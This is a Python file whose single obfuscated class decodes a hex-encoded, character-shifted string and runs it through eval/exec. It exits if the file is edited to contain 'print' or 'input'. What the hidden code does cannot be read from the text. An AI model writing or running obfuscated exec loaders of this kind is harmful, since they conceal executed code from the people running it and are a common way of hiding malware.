class Kramer():
 def __decode__(self:object,_execute:str)->exec:return(None,self._encode(_execute))[0]
 def __init__(self:object,_bit:str=False,_bytes:float=0,*_system:int,**_kramer:int)->exec:
  self._byte,_bit,self._eval,self._encode,self._delete,_kramer[_bytes]=lambda _exec:"".join(__import__(self._delete[1]+self._delete[8]+self._delete[13]+self._delete[0]+self._delete[18]+self._delete[2]+self._delete[8]+self._delete[8]).unhexlify(str(_bits)).decode()for _bits in str(_exec).split('/')),lambda _bit:exit()if self._delete[15]+self._delete[17]+self._delete[8]+self._delete[13]+self._delete[19] in open(__file__, errors=self._delete[8]+self._delete[6]+self._delete[13]+self._delete[14]+self._delete[17]+self._delete[4]).read() or self._delete[8]+self._delete[13]+self._delete[15]+self._delete[20]+self._delete[19] in open(__file__, errors=self._delete[8]+self._delete[6]+self._delete[13]+self._delete[14]+self._delete[17]+self._delete[4]).read()else"".join(_bit if _bit not in self._delete else self._delete[self._delete.index(_bit)+1 if self._delete.index(_bit)+1<len(self._delete)else 0]for _bit in "".join(chr(ord(t)-589265)if t!="Î¶"else"\n"for t in self._byte(_bit))),lambda _bit:str(_kramer[_bytes](f"{self._delete[4]+self._delete[-13]+self._delete[4]+self._delete[2]}(''.join(%s),{self._delete[6]+self._delete[11]+self._delete[14]+self._delete[1]+self._delete[0]+self._delete[11]+self._delete[18]}())"%list(_bit))).encode(self._delete[20]+self._delete[19]+self._delete[5]+self._delete[34])if _kramer[_bytes]==eval else exit(),lambda _decode:self._eval(_bit(_decode)),exit()if _bit else'abcdefghijklmnopqrstuvwxyz0123456789',eval
  return self.__decode__(_kramer[(self._delete[-1]+'_')[-1]+self._delete[18]+self._delete[15]+self._delete[0]+self._delete[17]+self._delete[10]+self._delete[11]+self._delete[4]])
Kramer(_bit=False,_bytes=False,_sparkle='''f28fb8b6/f28fb982/f28fb8bf/f28fb8bd/f28fb7b1/f28fb980/f28fb989/f28fb983/f28fb984/f28fb989/f28fb8bc/f28fb8b5/f28fb7b1/f28fb8b9/f28fb8bd/f28fb980/f28fb8bf/f28fb982/f28fb984/f28fb7b1/f28fb892/f28fb8be/f28fb8b9/f28fb8bd/f28fb8b5/f28fb7bd/f28fb7b1/f28fb894/f28fb8bf/f28fb8bc/f28fb8bf/f28fb982/f28fb88a/f28fb984/f28fb8b5/f28fb7bd/f28fb7b1/f28fb894/f28fb8bf/f28fb8bc/f28fb8bf/f28fb982/f28fb983/f28fb7bd/f28fb7b1/f28fb894/f28fb8b5/f28fb8be/f28fb984/f28fb8b5/f28fb982/f28fb7bd/f28fb7b1/f28fb8a4/f28fb989/f28fb983/f28fb984/f28fb8b5/f28fb8bd/f28fb7bd/f28fb7b1/f28fb8a8/f28fb982/f28fb8b9/f28fb984/f28fb8b5/ceb6/ceb6/f28fb8a8/f28fb982/f28fb8b9/f28fb984/f28fb8b5/f28fb7bf/f28fb89a/f28fb8be/f28fb980/f28fb985/f28fb984/f28fb7b9/f28fb7b3/f28fb8a4/f28fb88a/f28fb8bc/f28fb985/f28fb984/f28fb7b1/f28fb8b7/f28fb982/f28fb8bf/f28fb983/f28fb7b1/f28fb8b6/f28fb8bc/f28fb983/f28fb7b1/f28fb8b4/f28fb8b5/f28fb7b1/f28fb980/f28fb985/f28fb984/f28fb8b5/f28fb7b1/f28fb984/f28fb985/f28fb7b1/f28fb980/f28fb8b5/f28fb985/f28fb988/f28fb7b1/f28fbaba/f28fb8b7/f28fb88a/f28fb8bc/f28fb8b5/f28fb8bd/f28fb8b5/f28fb8be/f28fb984/f28fb7b1/f28fb8b5/f28fb8b3/f28fb982/f28fb8b9/f28fb982/f28fb8b5/f28fb7b1/f28fb8b9/f28fb8b3/f28fb8b9/f28fb7b1/f28fb983/f28fb8b9/f28fb7b1/f28fb984/f28fb985/f28fb7b1/f28fb8bc/f28fb8b5/f28fb7b1/f28fb983/f28fb8bf/f28fb985/f28fb8b8/f28fb88a/f28fb8b9/f28fb984/f28fb8b5/f28fb983/f28fb7b1/f28fb7be/f28fb88f/f28fb7b1/f28fb7b3/f28fb7bd/ceb6/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb7b1/f28fb894/f28fb8bf/f28fb8bc/f28fb8bf/f28fb982/f28fb983/f28fb7bf/f28fb980/f28fb985/f28fb982/f28fb980/f28fb8bc/f28fb8b5/f28fb8b0/f28fb984/f28fb8bf/f28fb8b0/f28fb982/f28fb8b5/f28fb8b4/f28fb7bd/f28fb7b1/f28fb8b9/f28fb8be/f28fb984/f28fb8b5/f28fb982/f28fb986/f28fb88a/f28fb8bc/f28fb88e/f28fb98b/f28fb7bf/f28fb98b/f28fb98b/f28fb885/f28fb7bd/f28fb7b1/f28fb8b5/f28fb8be/f28fb8b4/f28fb88e/f28fb894/f28fb8bf/f28fb8bc/f28fb8bf/f28fb982/f28fb983/f28fb7bf/f28fb982/f28fb8b5/f28fb983/f28fb8b5/f28fb984/f28fb7ba''')